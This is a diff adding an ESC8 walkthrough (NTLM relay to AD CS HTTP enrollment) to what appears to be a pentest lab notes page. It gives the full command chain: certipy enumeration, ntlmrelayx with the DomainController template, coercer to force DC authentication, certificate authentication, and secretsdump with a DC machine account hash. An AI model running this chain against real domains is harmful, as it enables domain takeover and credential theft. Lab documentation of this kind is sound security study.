@@ -97,3 +97,41 @@ evil-winrm -i 10.10.11.222 -u administrator
 ```
 
 </details>
+
+<details>
+
+<summary>Exploitation (NTLM Relay to ADCS HTTP Endpoints)</summary>
+
+```bash
+# Finding ESC8 Vulnerability (Web Enrollment over HTTP)
+certipy-ad find -u 'adam@corp.com' -p lab -dc-ip 192.168.167.60 -enabled
+cat 20250705224614_Certipy.txt
+```
+
+<figure><img src=".gitbook/assets/image (367).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (368).png" alt=""><figcaption><p>DomainController certificate template is a default template in ADCS and allows both Client and Server Authentication</p></figcaption></figure>
+
+```bash
+# Coerce DC (.60) to authenticate with us (.245) via NTLM, (.61) is CA --> relay authentication for certificate request:
+impacket-ntlmrelayx -t http://192.168.167.61/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
+
+coercer coerce --target-ip 192.168.167.60 --l 192.168.45.245 -u adam -p lab --filter-method-name EfsRpcAddUsersToFile
+```
+
+<figure><img src=".gitbook/assets/image (369).png" alt=""><figcaption><p>Obtained a certificate based on the DomainController certificate template in a pfx format.</p></figcaption></figure>
+
+```bash
+# Authenticate to DC as DC machine account with Certipy
+certipy-ad auth -pfx DC08$.pfx -dc-ip 192.168.167.60
+```
+
+<figure><img src=".gitbook/assets/image (370).png" alt=""><figcaption><p>Got DC machine account and hash</p></figcaption></figure>
+
+```bash
+impacket-secretsdump corp.com/'dc08$'@192.168.167.60 -hashes :0e0b464f36ca316cbd3170dad42bea33
+```
+
+<figure><img src=".gitbook/assets/image (371).png" alt=""><figcaption></figcaption></figure>
+
+</details>
